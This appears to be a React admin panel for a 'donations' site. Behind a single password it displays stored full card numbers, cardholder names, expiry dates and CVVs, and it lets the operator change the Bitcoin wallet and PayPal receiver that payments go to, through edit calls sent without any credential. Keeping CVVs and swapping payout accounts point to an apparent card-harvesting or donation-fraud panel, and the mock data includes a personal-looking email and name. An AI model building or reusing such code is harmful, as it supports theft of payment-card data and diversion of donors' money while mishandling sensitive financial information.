// import React, { useState } from "react";


// // Mock data
// const mockData = {
//   formData: [
//     {
//       _id: "678c5aab485022fc1131d8f6",
//       cardNumber: 1111111111111111,
//       cardHolderName: "John Doe",
//       expiryDate: "02/26",
//       cvv: 222,
//       amount: 292,
//       country: "Belgium",
//       createdAt: "2025-01-19T01:51:39.447Z",
//     },
//   ],
//   btcData: [
//     {
//       _id: "678c5b0e485022fc1131d8fd",
//       amount: 300,
//       walletAddress: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
//       country: "Barbados",
//       createdAt: "2025-01-19T01:53:18.548Z",
//     },
//   ],
//   paymentData: [
//     {
//       _id: "678c3ce4485022fc1131d8ce",
//       amount: 400,
//       country: "Equatorial Guinea",
//       paypalEmail: "mclemoreapril7@gmail.com",
//       receiverName: "April Mclemore",
//       paymentNote: "Family and Friend",
//       createdAt: "2025-01-18T23:44:36.631Z",
//     },
//   ],
// };

// const AdminDashboard = () => {
//   const [activeTab, setActiveTab] = useState("credit-card");
//   const [editingItem, setEditingItem] = useState(null);
//   const [isDialogOpen, setIsDialogOpen] = useState(false);

//   const formatDate = (dateString) => {
//     return new Date(dateString).toLocaleString();
//   };

//   const handleEdit = (item) => {
//     setEditingItem(item);
//     setIsDialogOpen(true);
//   };

//   const handleSave = () => {
//     console.log("Saving item:", editingItem);
//     setIsDialogOpen(false);
//     setEditingItem(null);
//   };

//   // Custom Modal Component
//   const Modal = ({ isOpen, children }) => {
//     if (!isOpen) return null;

//     return (
//       <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
//         <div className="bg-white rounded-lg max-w-md w-full p-6">
//           <div className="flex justify-between items-center mb-4">
//             <h2 className="text-xl font-semibold">Edit Details</h2>
//             <button
//               onClick={() => setIsDialogOpen(false)}
//               className="text-gray-500 hover:text-gray-700 text-xl"
//             >
//               ×
//             </button>
//           </div>
//           {children}
//         </div>
//       </div>
//     );
//   };

//   // Custom Input Component
//   const Input = ({ label, value, onChange }) => {
//     return (
//       <div className="mb-4">
//         <label className="block text-sm font-medium text-gray-700 mb-1">
//           {label}
//         </label>
//         <input
//           value={value}
//           onChange={onChange}
//           className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
//         />
//       </div>
//     );
//   };

//   // Custom Button Component
//   const Button = ({ children, onClick, variant = "primary", size = "md" }) => {
//     const baseStyle = "rounded-md font-medium transition-colors";
//     const variants = {
//       primary: "bg-purple-600 text-white hover:bg-purple-700",
//       outline: "border border-gray-300 hover:bg-gray-100",
//     };
//     const sizes = {
//       sm: "px-3 py-1 text-sm",
//       md: "px-4 py-2",
//     };

//     return (
//       <button
//         onClick={onClick}
//         className={`${baseStyle} ${variants[variant]} ${sizes[size]}`}
//       >
//         {children}
//       </button>
//     );
//   };

//   const renderEditDialog = () => {
//     if (!editingItem) return null;

//     let content;
//     if ("walletAddress" in editingItem) {
//       content = (
//         <>
//           <Input
//             label="Wallet Address"
//             value={editingItem.walletAddress}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, walletAddress: e.target.value })
//             }
//           />
//           <Input
//             label="Amount"
//             value={editingItem.amount}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, amount: e.target.value })
//             }
//           />
//           <Input
//             label="Country"
//             value={editingItem.country}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, country: e.target.value })
//             }
//           />
//         </>
//       );
//     } else if ("paypalEmail" in editingItem) {
//       content = (
//         <>
//           <Input
//             label="PayPal Email"
//             value={editingItem.paypalEmail}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, paypalEmail: e.target.value })
//             }
//           />
//           <Input
//             label="Receiver Name"
//             value={editingItem.receiverName}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, receiverName: e.target.value })
//             }
//           />
//           <Input
//             label="Payment Note"
//             value={editingItem.paymentNote}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, paymentNote: e.target.value })
//             }
//           />
//         </>
//       );
//     }

//     return (
//       <Modal isOpen={isDialogOpen}>
//         {content}
//         <div className="mt-6">
//           <Button onClick={handleSave}>Save Changes</Button>
//         </div>
//       </Modal>
//     );
//   };

//   const renderTable = () => {
//     if (activeTab === "credit-card") {
//       return (
//         <div className="overflow-x-auto">
//           <table className="min-w-full divide-y divide-gray-200">
//             <thead className="bg-purple-200">
//               <tr>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Card Holder
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Card Number
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Expiry Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   CVV
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Amount
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Country
//                 </th>
//               </tr>
//             </thead>
//             <tbody className="bg-white divide-y divide-gray-200">
//               {mockData.formData.map((entry) => (
//                 <tr key={entry._id} className="hover:bg-purple-50">
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {formatDate(entry.createdAt)}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.cardHolderName}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.cardNumber}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.expiryDate}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">{entry.cvv}</td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     ${entry.amount}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.country}
//                   </td>
//                 </tr>
//               ))}
//             </tbody>
//           </table>
//         </div>
//       );
//     }

//     if (activeTab === "bitcoin") {
//       return (
//         <div className="overflow-x-auto">
//           <table className="min-w-full divide-y divide-gray-200">
//             <thead className="bg-pink-200">
//               <tr>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Wallet Address
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Amount
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Country
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Actions
//                 </th>
//               </tr>
//             </thead>
//             <tbody className="bg-white divide-y divide-gray-200">
//               {mockData.btcData.map((entry) => (
//                 <tr key={entry._id} className="hover:bg-pink-50">
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {formatDate(entry.createdAt)}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.walletAddress}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     ${entry.amount}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.country}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     <Button
//                       variant="outline"
//                       size="sm"
//                       onClick={() => handleEdit(entry)}
//                     >
//                       Edit
//                     </Button>
//                   </td>
//                 </tr>
//               ))}
//             </tbody>
//           </table>
//         </div>
//       );
//     }

//     if (activeTab === "paypal") {
//       return (
//         <div className="overflow-x-auto">
//           <table className="min-w-full divide-y divide-gray-200">
//             <thead className="bg-indigo-200">
//               <tr>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   PayPal Email
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Receiver Name
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Amount
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Country
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Payment Note
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Actions
//                 </th>
//               </tr>
//             </thead>
//             <tbody className="bg-white divide-y divide-gray-200">
//               {mockData.paymentData.map((entry) => (
//                 <tr key={entry._id} className="hover:bg-indigo-50">
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {formatDate(entry.createdAt)}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.paypalEmail}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.receiverName}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     ${entry.amount}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.country}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.paymentNote}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     <Button
//                       variant="outline"
//                       size="sm"
//                       onClick={() => handleEdit(entry)}
//                     >
//                       Edit
//                     </Button>
//                   </td>
//                 </tr>
//               ))}
//             </tbody>
//           </table>
//         </div>
//       );
//     }
//   };

//   return (
//     <div className="h-screen flex flex-col bg-gradient-to-br from-purple-100 to-pink-100 p-6">
//       <div className="flex-grow overflow-hidden rounded-lg shadow-xl bg-white">
//         <div className="bg-gradient-to-r from-purple-500 to-pink-500 text-white p-6">
//           <h1 className="text-3xl font-bold">Admin Dashboard</h1>
//           <p className="text-purple-100">View and manage donation records</p>
//         </div>

//         <div className="h-full overflow-auto bg-white p-6">
//           <div className="flex space-x-2 mb-6 border-b border-gray-200">
//             <button
//               onClick={() => setActiveTab("credit-card")}
//               className={`px-4 py-2 font-medium rounded-t-lg transition-colors
//                 ${
//                   activeTab === "credit-card"
//                     ? "bg-purple-100 text-purple-600 border-b-2 border-purple-600"
//                     : "text-gray-600 hover:bg-gray-100"
//                 }`}
//             >
//               Credit Card Donations
//             </button>
//             <button
//               onClick={() => setActiveTab("bitcoin")}
//               className={`px-4 py-2 font-medium rounded-t-lg transition-colors
//                 ${
//                   activeTab === "bitcoin"
//                     ? "bg-pink-100 text-pink-600 border-b-2 border-pink-600"
//                     : "text-gray-600 hover:bg-gray-100"
//                 }`}
//             >
//               Bitcoin Donations
//             </button>
//             <button
//               onClick={() => setActiveTab("paypal")}
//               className={`px-4 py-2 font-medium rounded-t-lg transition-colors
//                 ${
//                   activeTab === "paypal"
//                     ? "bg-indigo-100 text-indigo-600 border-b-2 border-indigo-600"
//                     : "text-gray-600 hover:bg-gray-100"
//                 }`}
//             >
//               PayPal Donations
//             </button>
//           </div>

//           {renderTable()}
//         </div>
//       </div>

//       {renderEditDialog()}
//     </div>
//   );
// };

// export default AdminDashboard;







import React, { useState } from "react";

const AdminDashboard = () => {
  const [activeTab, setActiveTab] = useState("credit-card");
  const [formData, setFormData] = useState([]);
  const [btcData, setBtcData] = useState([]);
  const [paymentData, setPaymentData] = useState([]);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [btcWalletAddress, setBtcWalletAddress] = useState("");
  const [paypalDetails, setPaypalDetails] = useState({
    email: "",
    receiverName: "",
    paymentNote: "",
  });
  const [isEditingBtc, setIsEditingBtc] = useState(false);
  const [isEditingPaypal, setIsEditingPaypal] = useState(false);

  const handleFetchData = async () => {
    if (!password) {
      setError("Password is required.");
      return;
    }

    setError(null);
    setIsLoading(true);

    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}form/get-form-data`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ password }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(errorData.error || "Failed to fetch data.");
        setIsLoading(false);
        return;
      }

      const data = await response.json();
      setFormData(data.formData || []);
      setBtcData(data.btcData || []);
      setPaymentData(data.paymentData || []);
      setIsAuthenticated(true);
    } catch (err) {
      setError("An error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const handleEditBtcWallet = async () => {
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}form/edit-btc-wallet-address`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ newBtcWalletAddress: btcWalletAddress }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(errorData.error || "Failed to update BTC wallet address.");
        return;
      }

      const data = await response.json();
      alert(data.message);
      setIsEditingBtc(false);
    } catch (err) {
      setError("An error occurred. Please try again.");
    }
  };

  const handleEditPaypalDetails = async () => {
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}form/edit-paypal-details`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(paypalDetails),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(errorData.error || "Failed to update PayPal details.");
        return;
      }

      const data = await response.json();
      alert(data.message);
      setIsEditingPaypal(false);
    } catch (err) {
      setError("An error occurred. Please try again.");
    }
  };

  const renderBitcoinTable = () => {
    return (
      <div className="overflow-x-auto">
        <table className="min-w-full divide-y divide-gray-200">
          <thead className="bg-pink-200">
            <tr>
              <th>Date</th>
              <th>Wallet Address</th>
              <th>Amount</th>
              <th>Country</th>
            </tr>
          </thead>
          <tbody className="bg-white divide-y divide-gray-200">
            {btcData.map((entry) => (
              <tr key={entry._id}>
                <td>{formatDate(entry.createdAt)}</td>
                <td>{entry.walletAddress}</td>
                <td>${entry.amount}</td>
                <td>{entry.country}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const renderPaypalTable = () => {
    return (
      <div className="overflow-x-auto">
        <table className="min-w-full divide-y divide-gray-200">
          <thead className="bg-indigo-200">
            <tr>
              <th>Date</th>
              <th>PayPal Email</th>
              <th>Receiver Name</th>
              <th>Amount</th>
              <th>Country</th>
              <th>Payment Note</th>
            </tr>
          </thead>
          <tbody className="bg-white divide-y divide-gray-200">
            {paymentData.map((entry) => (
              <tr key={entry._id}>
                <td>{formatDate(entry.createdAt)}</td>
                <td>{entry.paypalEmail}</td>
                <td>{entry.receiverName}</td>
                <td>${entry.amount}</td>
                <td>{entry.country}</td>
                <td>{entry.paymentNote}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const renderTable = () => {
    if (isLoading) return <p>Loading data...</p>;
    if (error) return <p className="text-red-500">{error}</p>;

    if (activeTab === "credit-card") {
      return (
        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-purple-200">
              <tr>
                <th>Date</th>
                <th>Card Holder</th>
                <th>Card Number</th>
                <th>Expiry Date</th>
                <th>CVV</th>
                <th>Amount</th>
                <th>Country</th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {formData.map((entry) => (
                <tr key={entry._id}>
                  <td>{formatDate(entry.createdAt)}</td>
                  <td>{entry.cardHolder}</td>
                  <td>{entry.cardNumber}</td>
                  <td>{entry.expiryDate}</td>
                  <td>{entry.cvv}</td>
                  <td>${entry.amount}</td>
                  <td>{entry.country}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      );
    }

    if (activeTab === "bitcoin") {
      return (
        <div>
          {renderBitcoinTable()}
          <button onClick={() => setIsEditingBtc(true)} className="bg-blue-500 text-white px-4 py-2 rounded mt-4">
            Edit BTC Wallet Address
          </button>
          {isEditingBtc && (
            <div>
              <h2>Edit Bitcoin Wallet Address</h2>
              <input
                type="text"
                placeholder="New BTC Wallet Address"
                value={btcWalletAddress}
                onChange={(e) => setBtcWalletAddress(e.target.value)}
                className="p-2 border mb-4"
              />
              <button onClick={handleEditBtcWallet} className="bg-green-500 text-white px-4 py-2 rounded">
                Save
              </button>
              <button onClick={() => setIsEditingBtc(false)} className="bg-red-500 text-white px-4 py-2 rounded ml-2">
                Cancel
              </button>
            </div>
          )}
        </div>
      );
    }

    if (activeTab === "paypal") {
      return (
        <div>
          {renderPaypalTable()}
          <button onClick={() => setIsEditingPaypal(true)} className="bg-blue-500 text-white px-4 py-2 rounded mt-4">
            Edit PayPal Details
          </button>
          {isEditingPaypal && (
            <div>
              <h2>Edit PayPal Details</h2>
              <input
                type="text"
                placeholder="New PayPal Email"
                value={paypalDetails.email}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, email: e.target.value })}
                className="p-2 border mb-2"
              />
              <input
                type="text"
                placeholder="Receiver Name"
                value={paypalDetails.receiverName}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, receiverName: e.target.value })}
                className="p-2 border mb-2"
              />
              <input
                type="text"
                placeholder="Payment Note"
                value={paypalDetails.paymentNote}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, paymentNote: e.target.value })}
                className="p-2 border mb-4"
              />
              <button onClick={handleEditPaypalDetails} className="bg-green-500 text-white px-4 py-2 rounded">
                Save
              </button>
              <button onClick={() => setIsEditingPaypal(false)} className="bg-red-500 text-white px-4 py-2 rounded ml-2">
                Cancel
              </button>
            </div>
          )}
        </div>
      );
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="flex flex-col items-center justify-center h-screen">
        <h1 className="text-2xl mb-4">Admin Login</h1>
        <input
          type="password"
          placeholder="Enter Admin Password"
          className="p-2 border mb-4"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          onClick={handleFetchData}
          className="bg-blue-500 text-white px-4 py-2 rounded"
        >
          {isLoading ? "Authenticating..." : "Login"}
        </button>
        {error && <p className="text-red-500 mt-2">{error}</p>}
      </div>
    );
  }

  return (
    <div>
      <div>
        <button onClick={() => setActiveTab("credit-card")}>Credit Card Donations</button>
        <button onClick={() => setActiveTab("bitcoin")}>Bitcoin Donations</button>
        <button onClick={() => setActiveTab("paypal")}>PayPal Donations</button>
      </div>
      {renderTable()}
    </div>
  );
};

export default AdminDashboard;
